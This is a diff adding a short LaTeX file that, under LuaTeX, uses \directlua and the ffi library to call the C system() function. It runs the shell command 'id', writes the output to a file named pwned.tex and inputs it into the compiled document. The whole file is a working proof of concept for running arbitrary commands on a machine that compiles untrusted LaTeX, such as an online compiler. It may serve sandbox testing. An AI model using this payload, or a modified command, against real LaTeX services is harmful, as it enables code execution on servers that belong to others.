@@ -1,0 +1,10 @@
+% Calls the C library through LuaJIT-style ffi.
+\documentclass{article}
+\begin{document}
+\directlua{
+  local ffi = require('ffi')
+  ffi.cdef('int system(const char *command);')
+  ffi.C.system('id > pwned.tex')
+}
+\input{pwned}
+\end{document}
